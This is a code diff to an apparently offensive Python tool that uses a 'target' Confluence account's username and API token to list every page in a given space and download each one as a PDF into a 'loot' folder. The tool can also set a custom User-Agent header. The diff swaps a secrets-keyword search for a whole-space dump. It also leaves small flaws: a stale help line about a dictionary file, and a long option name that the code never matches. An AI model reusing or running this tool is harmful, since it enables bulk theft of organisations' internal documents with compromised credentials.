@@ -1,3 +1,5 @@
+from operator import truediv
+
 import requests, json, sys, getopt, time
 
 # Set that holds all of the pages found in the keyword search
@@ -32,6 +34,34 @@ def getNumberOfPages(query, username, access_token, cURL):
     jsonResp = response.json()
     totalSize = int(jsonResp["totalSize"])
     return totalSize
+
+def searchSpace(spaceId, username, access_token, cURL):
+    print("[*] Searching for Confluence for pages in space: %s" % spaceId)
+
+    next = True
+    q = "/wiki/api/v2/pages?space-id={spaceId}&limit=250".format(spaceId=spaceId)
+
+    while next:
+        URL = cURL + q
+
+        response = requests.request("GET",
+                                    URL,
+                                    auth=(username, access_token),
+                                    )
+        jsonResp = json.loads(response.text)
+
+        for results in jsonResp['results']:
+            pageId = results['id']
+            page_name = results['title']
+            id_and_name = pageId + "," + page_name
+            contentSet.add(id_and_name)
+
+        if 'next' in jsonResp['_links']:
+            q = jsonResp['_links']['next']
+        else:
+            next = False
+
+    print("[*] Compiled set of %i unique pages to download from your search" % len(contentSet))
 
 def searchKeyWords(path, username, access_token, cURL):
     search_term = " "
@@ -102,21 +132,24 @@ def downloadContent(username, access_token, cURL):
         page = contentId.split(",", 1)
         url = cURL + "/wiki/spaces/flyingpdf/pdfpageexport.action?pageId={pageId}".format(pageId=page[0])
         url = get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token)
-        url = cURL + "/wiki/" + url
-        try:
-            response = requests.request("GET",
-                url,
-                auth=(username, access_token),
-                headers=headers
-            )
+        if url != None:
+            url = cURL + "/wiki/" + url
+            try:
+                response = requests.request("GET",
+                    url,
+                    auth=(username, access_token),
+                    headers=headers
+                )
 
-            path = "loot/{file_name}-{pageId}.pdf".format(file_name=page[1], pageId=page[0])
-            with open(path, 'wb') as f:
-                f.write(response.content)
-            print('[*] Downloaded %i of %i files: %s-%s.pdf' % (count, set_length, page[1], page[0]))
-            count += 1
-        except Exception as err:
-            print("Error : " + str(err))
+                path = "loot/{file_name}-{pageId}.pdf".format(file_name=page[1], pageId=page[0])
+                with open(path, 'wb') as f:
+                    f.write(response.content)
+                print('[*] Downloaded %i of %i files: %s-%s.pdf' % (count, set_length, page[1], page[0]))
+                count += 1
+            except Exception as err:
+                print("Error : " + str(err))
+        else:
+            print("[*] Skipped download for contentId: %s" % contentId)
 
 def get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token):
     """
@@ -132,7 +165,7 @@ def get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token)
     try:
         long_running_task = True
         headers = form_token_headers
-        #print("[*] Initiating PDF export from Confluence Cloud")
+        print("[*] Initiating PDF export from Confluence Cloud")
         response = requests.request("GET",
             url,
             auth=(username, access_token),
@@ -177,7 +210,7 @@ def get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token)
 
 def main():
     cURL=""
-    dict_path = ""
+    space_id = ""
     username = ""
     access_token = ""
     user_agent = ""
@@ -197,9 +230,8 @@ def main():
     help += '\n\t\tThe username of target Confluence account'
     help += '\n\t-p <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>'
     help += '\n\t\tThe API Access Token of target Confluence account'
-    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
+    help += '\n\t-s <SPACE ID>, --space <SPACE ID>'
     help += '\n\t\tPath to the dictionary file.'
-    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
     help += '\n\noptional arguments:'
     help += '\n\t-a "<DESIRED UA STRING>", --user-agent "<DESIRED UA STRING>"'
     help += '\n\t\tThe User-Agent string you wish to send in the http request.'
@@ -209,7 +241,7 @@ def main():
 
     # try parsing options and arguments
     try :
-        opts, args = getopt.getopt(sys.argv[1:], "hc:u:p:d:a:", ["help", "url=", "user=", "accesstoken=", "dict=", "user-agent="])
+        opts, args = getopt.getopt(sys.argv[1:], "hc:u:p:s:a:", ["help", "url=", "user=", "accesstoken=", "space_id=", "user-agent="])
     except getopt.GetoptError as err:
         print(str(err))
         print(usage)
@@ -224,8 +256,8 @@ def main():
             username = arg
         if opt in ("-p", "--accesstoken"):
             access_token = arg
-        if opt in ("-d", "--dict"):
-            dict_path = arg
+        if opt in ("-s", "--space"):
+            space_id = arg
         if opt in ("-a", "--user-agent"):
             user_agent = arg
 
@@ -240,10 +272,11 @@ def main():
         print(usage)
         sys.exit(2)
 
-    if not dict_path:
-        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
+    if not space_id:
+        print("\nSpace ID (-s, --space) is a mandatory argument\n")
         print(usage)
         sys.exit(2)
+
     if not cURL:
         print("\nConfluence URL  (-c, --url) is a mandatory argument\n")
         print(usage)
@@ -258,7 +291,8 @@ def main():
         default_headers['User-Agent'] = user_agent
         form_token_headers['User-Agent'] = user_agent
 
-    searchKeyWords(dict_path, username, access_token, cURL)
+    # searchKeyWords(dict_path, username, access_token, cURL)
+    searchSpace(space_id, username, access_token, cURL)
     downloadContent(username, access_token, cURL)
 
 if __name__ == "__main__":
